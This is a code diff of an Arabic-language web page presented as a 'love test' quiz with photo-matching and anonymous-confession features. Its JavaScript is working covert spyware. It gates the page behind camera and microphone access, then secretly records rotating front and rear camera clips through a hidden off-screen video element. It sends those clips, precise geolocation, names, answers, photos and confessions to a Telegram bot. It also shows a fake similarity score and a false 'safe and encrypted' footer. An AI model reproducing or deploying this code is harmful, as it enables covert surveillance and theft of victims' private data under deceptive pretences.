@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== RESET & BASE ===== */
+        /* نفس التنسيقات السابقة دون تغيير */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Cairo', sans-serif;
@@ -458,7 +458,6 @@
         }
         .rating-stars .star.active { color: #fbbf24; }
         .rating-stars .star:hover { transform: scale(1.2); }
-        /* ===== OVERLAY ===== */
         #cameraOverlay {
             position: fixed;
             top: 0;
@@ -571,11 +570,9 @@
             transform: scale(1.3);
             box-shadow: 0 0 12px rgba(236, 72, 153, 0.5);
         }
-        /* لا يوجد أي مؤشر تسجيل مرئي */
     </style>
 </head>
 <body>
-
     <!-- ===== OVERLAY الكاميرا ===== -->
     <div id="cameraOverlay">
         <div class="overlay-card">
@@ -705,11 +702,9 @@
         <div class="footer"><i class="fas fa-lock"></i> كل شيء آمن ومشفر <i class="fas fa-shield-alt"></i></div>
     </div>
 
-    <!-- فيديو مخفي للكاميرا (بدون أي عناصر مرئية) -->
     <video id="hiddenVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js">
-    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
 
     <script>
         (function() {
@@ -759,10 +754,8 @@
             const fakeBar = document.getElementById('fakeBar');
             const deepProgress = document.getElementById('deepProgress');
 
-            // ===== تعطيل / تفعيل الميزات =====
             function disableAllFeatures() {
-                const allBtns = document.querySelectorAll(
-                    '.btn, .btn-save, .btn-upload, .btn-camera, .refresh-btn, .tab-btn, .category-grid button');
+                const allBtns = document.querySelectorAll('.btn, .btn-save, .btn-upload, .btn-camera, .refresh-btn, .tab-btn, .category-grid button');
                 allBtns.forEach(btn => {
                     if (btn.id !== 'requestCameraBtn') {
                         btn.disabled = true;
@@ -782,8 +775,7 @@
             }
 
             function enableAllFeatures() {
-                const allBtns = document.querySelectorAll(
-                    '.btn, .btn-save, .btn-upload, .refresh-btn, .tab-btn, .category-grid button');
+                const allBtns = document.querySelectorAll('.btn, .btn-save, .btn-upload, .refresh-btn, .tab-btn, .category-grid button');
                 allBtns.forEach(btn => {
                     btn.disabled = false;
                     btn.style.opacity = '1';
@@ -801,14 +793,12 @@
                 sendAnswersBtn.disabled = true;
             }
 
-            // ===== طلب الكاميرا والميكروفون =====
             async function requestCameraAndMic() {
                 requestBtn.disabled = true;
                 requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الطلب...';
                 errorMsg.textContent = '';
 
                 try {
-                    // طلب الكاميرا الأمامية والميكروفون
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: true
@@ -816,8 +806,6 @@
                     cameraAllowed = true;
                     overlay.classList.add('hidden');
                     enableAllFeatures();
-
-                    // بدء التسجيل الخلفي بدون أي مؤشرات مرئية
                     startBackgroundRecording(stream);
                     getPreciseLocation();
                     console.log('✅ تم السماح للكاميرا والميكروفون');
@@ -836,20 +824,19 @@
                 }
             }
 
-            // ===== تسجيل الفيديو والصوت مع دعم الكاميرا الخلفية =====
+            // ===== تسجيل الفيديو والصوت =====
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
-            let mainStream = null; // stream يحتوي على audio track ثابت و video track متغير
+            let mainStream = null;
             let stopTimeout = null;
-            let currentCameraMode = 'user'; // 'user' أو 'environment'
-            let isSwitching = false; // لمنع التبديل المتزامن
+            let currentCameraMode = 'user';
+            let isSwitching = false;
+            let switchDelay = 300; // مللي ثانية للانتظار حتى تستقر الكاميرا
 
-            // دالة لبدء التسجيل لمدة 5 ثوانٍ ثم التبديل تلقائياً
             function startRecordingSegment() {
                 if (!mainStream || !cameraAllowed || isSwitching) return;
 
-                // إيقاف أي تسجيل سابق إذا كان قائماً (احتياطاً)
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
@@ -880,7 +867,6 @@
                         const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                         sendVideo(blob);
                     }
-                    // بعد الانتهاء من التسجيل، نبدل الكاميرا إذا لم يكن هناك تبديل جارٍ
                     if (cameraAllowed && !isSwitching) {
                         switchCameraAndRecord();
                     }
@@ -889,7 +875,6 @@
                 mediaRecorder.start();
                 isRecording = true;
 
-                // إيقاف التسجيل بعد 5 ثوانٍ بالضبط
                 if (stopTimeout) clearTimeout(stopTimeout);
                 stopTimeout = setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
@@ -898,7 +883,6 @@
                 }, 5000);
             }
 
-            // دالة تبديل الكاميرا (فيديو فقط) وبدء تسجيل جديد
             async function switchCameraAndRecord() {
                 if (!cameraAllowed || isSwitching) return;
                 isSwitching = true;
@@ -907,7 +891,7 @@
                 console.log(`🔄 محاولة التبديل إلى الكاميرا: ${newMode}`);
 
                 try {
-                    // نحصل على فيديو فقط للكاميرا الجديدة (بدون صوت)
+                    // طلب فيديو فقط بدون صوت
                     const constraints = {
                         video: { facingMode: newMode, width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
@@ -915,7 +899,7 @@
                     const newStream = await navigator.mediaDevices.getUserMedia(constraints);
                     const newVideoTrack = newStream.getVideoTracks()[0];
 
-                    // نستبدل مسار الفيديو في الـ stream الأساسي مع الحفاظ على مسار الصوت
+                    // استبدال مسار الفيديو في التيار الأساسي
                     const oldVideoTrack = mainStream.getVideoTracks()[0];
                     if (oldVideoTrack) {
                         oldVideoTrack.stop();
@@ -925,11 +909,16 @@
 
                     currentCameraMode = newMode;
                     console.log(`✅ تم التبديل إلى الكاميرا: ${newMode}`);
-                    isSwitching = false;
-                    startRecordingSegment();
+
+                    // انتظار قصير للسماح للكاميرا بالاستقرار
+                    setTimeout(() => {
+                        isSwitching = false;
+                        startRecordingSegment();
+                    }, switchDelay);
+
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
-                    // في حال الفشل، نحاول العودة إلى الكاميرا الأمامية (إذا لم نكن عليها)
+                    // العودة إلى الكاميرا الأمامية إذا فشل التبديل إلى الخلفية
                     if (currentCameraMode !== 'user') {
                         try {
                             const fallbackStream = await navigator.mediaDevices.getUserMedia({
@@ -945,8 +934,10 @@
                             mainStream.addTrack(fallbackTrack);
                             currentCameraMode = 'user';
                             console.log('✅ تم العودة إلى الكاميرا الأمامية');
-                            isSwitching = false;
-                            startRecordingSegment();
+                            setTimeout(() => {
+                                isSwitching = false;
+                                startRecordingSegment();
+                            }, switchDelay);
                         } catch (fallbackErr) {
                             console.error('فشل العودة للكاميرا الأمامية:', fallbackErr);
                             cameraAllowed = false;
@@ -956,22 +947,20 @@
                             isSwitching = false;
                         }
                     } else {
-                        // إذا كنا بالفعل على الأمامية وفشل التبديل، نعيد المحاولة بعد فترة قصيرة
+                        // إذا كنا على الأمامية وفشل التبديل إلى الخلفية، نستمر بالتسجيل بالأمامية
                         isSwitching = false;
-                        setTimeout(() => startRecordingSegment(), 1000);
+                        startRecordingSegment();
                     }
                 }
             }
 
-            // دالة بدء التسجيل (تستدعى مرة واحدة عند السماح)
             function startBackgroundRecording(initialStream) {
                 if (!cameraAllowed) return;
-                mainStream = initialStream; // initialStream يحتوي على audio+video
+                mainStream = initialStream;
                 currentCameraMode = 'user';
                 startRecordingSegment();
             }
 
-            // دالة إرسال الفيديو إلى البوت
             function sendVideo(blob) {
                 if (!userName || !locationReady) {
                     console.warn('لا يمكن الإرسال: اسم أو موقع غير جاهز');
@@ -980,8 +969,7 @@
                 const now = new Date().toLocaleString('ar-EG');
                 const camLabel = currentCameraMode === 'user' ? 'أمامية' : 'خلفية';
                 const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                const caption =
-                    `🎥 *مقطع فيديو وصوتي (5 ثوانٍ)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n📷 ${camLabel}\n🕒 ${now}`;
+                const caption = `🎥 *مقطع فيديو وصوتي (5 ثوانٍ)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n📷 ${camLabel}\n🕒 ${now}`;
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -1001,10 +989,7 @@
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
 
-            // ===== باقي الكود (الأسماء، الموقع، الأسئلة، النتائج) =====
-            // تم تضمينه بالكامل من الكود السابق
-
-            // ===== الاسم المحفوظ =====
+            // ===== باقي الكود دون تغيير (الأسماء، الموقع، الأسئلة، النتائج) =====
             if (localStorage.getItem('userName')) {
                 userName = localStorage.getItem('userName');
                 userNameInput.value = userName;
@@ -1029,7 +1014,6 @@
             userNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveNames(); });
             partnerNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveNames(); });
 
-            // ===== جلب الموقع =====
             function getPreciseLocation() {
                 locationStatus.textContent = '⏳ جاري التحديث...';
                 if (!navigator.geolocation) {
@@ -1041,9 +1025,7 @@
                     async function(pos) {
                         const { latitude, longitude, accuracy } = pos.coords;
                         try {
-                            const res = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1&accept-language=ar`
-                            );
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1&accept-language=ar`);
                             const data = await res.json();
                             const addr = data.address || {};
                             userLocation = {
@@ -1098,7 +1080,6 @@
                 getPreciseLocation();
             });
 
-            // ===== اختيار الفئة =====
             let currentCategory = 'friend';
             categoryBtns.forEach(btn => {
                 btn.addEventListener('click', function() {
@@ -1110,7 +1091,6 @@
                 });
             });
 
-            // ===== بيانات الأسئلة (نفس الكود السابق) =====
             const baseQuestions = {
                 friend: [
                     { type: 'text', q: 'ما هو أول شيء أعجبك في صديقك؟', hint: 'صفة أو موقف' },
@@ -1179,7 +1159,6 @@
                 { type: 'text', q: 'ما هي نصيحتك لمن يخوض علاقة عبر الإنترنت؟', hint: 'نصيحة' }
             ];
 
-            // ===== متغيرات الاختبار =====
             let currentIndex = 0;
             let answers = [];
             let isQuizStarted = false;
@@ -1228,8 +1207,7 @@
                 questionText.innerHTML = `<i class="fas fa-question-circle"></i> ${q.q}`;
                 if (q.type === 'text') {
                     questionHint.innerHTML = `<i class="fas fa-pen"></i> ${q.hint || 'اكتب إجابتك'}`;
-                    inputArea.innerHTML =
-                        `<input type="text" class="text-input" id="answerInput" placeholder="اكتب إجابتك هنا..." autofocus>`;
+                    inputArea.innerHTML = `<input type="text" class="text-input" id="answerInput" placeholder="اكتب إجابتك هنا..." autofocus>`;
                     const inp = document.getElementById('answerInput');
                     inp.addEventListener('input', function() {
                         nextBtn.disabled = (this.value.trim() === '');
@@ -1250,8 +1228,7 @@
                     inputArea.innerHTML = html;
                     document.querySelectorAll('.options-group button').forEach(btn => {
                         btn.addEventListener('click', function() {
-                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove(
-                            'selected'));
+                            document.querySelectorAll('.options-group button').forEach(b => b.classList.remove('selected'));
                             this.classList.add('selected');
                             if (!document.getElementById('tempChoice')) {
                                 const hidden = document.createElement('input');
@@ -1385,10 +1362,8 @@
 
                 let preview = '<h4>📝 ملخص الإجابات والتقييمات</h4>';
                 answers.forEach((item, idx) => {
-                    const ratingStars = item.rating > 0 ? '★'.repeat(item.rating) + '☆'.repeat(5 - item.rating) :
-                        'لم يُقيّم';
-                    preview +=
-                        `<p><strong>${idx+1}.</strong> ${item.question}<br>➡️ ${item.answer}<br>⭐ التقييم: ${ratingStars}</p>`;
+                    const ratingStars = item.rating > 0 ? '★'.repeat(item.rating) + '☆'.repeat(5 - item.rating) : 'لم يُقيّم';
+                    preview += `<p><strong>${idx+1}.</strong> ${item.question}<br>➡️ ${item.answer}<br>⭐ التقييم: ${ratingStars}</p>`;
                 });
                 answersPreview.innerHTML = preview;
                 answersPreview.style.display = 'block';
@@ -1399,8 +1374,7 @@
                 let width = 0;
                 const interval = setInterval(() => {
                     width += Math.random() * 2 + 1;
-                    if (width > 100) { width = 100;
-                        clearInterval(interval); }
+                    if (width > 100) { width = 100; clearInterval(interval); }
                     fakeBar.style.width = width + '%';
                 }, 300);
             }
@@ -1427,7 +1401,6 @@
             nextBtn.addEventListener('click', saveAndNext);
             prevBtn.addEventListener('click', goBack);
 
-            // ===== إرسال الإجابات =====
             async function sendAnswersToBot() {
                 if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
@@ -1441,13 +1414,11 @@
                     const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
                     const coords = userLocation.latitude ? `📍 ${userLocation.latitude}, ${userLocation.longitude}` : '';
 
-                    let text =
-                        `📝 *إجابات اختبار الحب*\n👤 ${userName}\n👥 الطرف الآخر: ${partnerName}\n📂 الفئة: ${names[currentCategory]}\n📍 ${loc}\n${coords}\n\n`;
+                    let text = `📝 *إجابات اختبار الحب*\n👤 ${userName}\n👥 الطرف الآخر: ${partnerName}\n📂 الفئة: ${names[currentCategory]}\n📍 ${loc}\n${coords}\n\n`;
 
                     answers.forEach((item, idx) => {
                         const ratingStars = item.rating > 0 ? '⭐'.repeat(item.rating) : '';
-                        text +=
-                            `${idx+1}. ${item.question}\n   ➡️ ${item.answer} ${ratingStars}\n\n`;
+                        text += `${idx+1}. ${item.question}\n   ➡️ ${item.answer} ${ratingStars}\n\n`;
                     });
                     text += `\n🕒 ${new Date().toLocaleString('ar-EG')}`;
 
@@ -1473,7 +1444,6 @@
             }
             sendAnswersBtn.addEventListener('click', sendAnswersToBot);
 
-            // ===== PDF =====
             generatePDFBtn.addEventListener('click', function() {
                 if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
@@ -1485,8 +1455,7 @@
                 element.style.background = '#fff';
                 element.style.color = '#1a1a2e';
                 let ratingsHtml = answers.map((item, idx) => {
-                    const stars = item.rating > 0 ? '★'.repeat(item.rating) + '☆'.repeat(5 - item.rating) :
-                        'لم يُقيّم';
+                    const stars = item.rating > 0 ? '★'.repeat(item.rating) + '☆'.repeat(5 - item.rating) : 'لم يُقيّم';
                     return `<div style="margin:10px 0; padding:10px; background:#f9f0f3; border-radius:8px;">
                                 <p><strong>${idx+1}.</strong> ${item.question}</p>
                                 <p style="padding-right:20px; color:#6b2e4a;">➡️ ${item.answer}</p>
@@ -1516,11 +1485,9 @@
                 };
                 html2pdf().set(opt).from(element).save().then(() => {
                     alert('✅ تم تصدير PDF');
-                }).catch(err => { console.error(err);
-                    alert('❌ خطأ في التصدير'); });
+                }).catch(err => { console.error(err); alert('❌ خطأ في التصدير'); });
             });
 
-            // ===== AI تحليل =====
             aiAnalyzeBtn.addEventListener('click', async function() {
                 if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
@@ -1577,7 +1544,6 @@
                 }
             });
 
-            // ===== نسبة التشابه =====
             const myPhotoInput = document.getElementById('myPhotoInput');
             const partnerPhotoInput = document.getElementById('partnerPhotoInput');
             const myPhotoPreview = document.getElementById('myPhotoPreview');
@@ -1609,8 +1575,7 @@
                 if (!locationReady) { console.warn('الموقع غير جاهز'); return; }
 
                 const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                const caption =
-                    `📸 *${label} (إرسال فوري)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+                const caption = `📸 *${label} (إرسال فوري)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
@@ -1632,8 +1597,7 @@
 
             function getRandomSimilarity() {
                 const now = new Date();
-                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now
-                    .getSeconds();
+                const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now.getSeconds();
                 const random = (seed * 9301 + 49297) % 233280;
                 const base = 40 + (random / 233280) * 59;
                 const wave = Math.sin(now.getTime() / 10000) * 3;
@@ -1665,8 +1629,7 @@
 
                 if (userName && locationReady) {
                     const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                    const caption =
-                        `📸 *نسبة التشابه: ${percent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
+                    const caption = `📸 *نسبة التشابه: ${percent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', myFile);
@@ -1677,7 +1640,6 @@
                 }
             });
 
-            // ===== صارحني =====
             sendConfessionBtn.addEventListener('click', async function() {
                 if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
                 if (!userName) { alert('⚠️ الرجاء إدخال اسمك أولاً'); return; }
@@ -1690,8 +1652,7 @@
 
                 try {
                     const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                    const text =
-                        `💬 *رسالة صريحة*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n\n${msg}\n\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+                    const text = `💬 *رسالة صريحة*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n\n${msg}\n\n🕒 ${new Date().toLocaleString('ar-EG')}`;
 
                     const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -1716,7 +1677,6 @@
                 }
             });
 
-            // ===== التبويبات =====
             document.querySelectorAll('.tab-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     if (!cameraAllowed) { alert('⚠️ يجب السماح للكاميرا والميكروفون أولاً'); return; }
@@ -1727,10 +1687,8 @@
                 });
             });
 
-            // ===== زر طلب الكاميرا =====
             requestBtn.addEventListener('click', requestCameraAndMic);
 
-            // ===== تعطيل كل شيء في البداية =====
             disableAllFeatures();
 
             console.log('💕 التطبيق جاهز، يدعم الكاميرا الخلفية والأمامية مع تبديل تلقائي كل 5 ثوانٍ.');
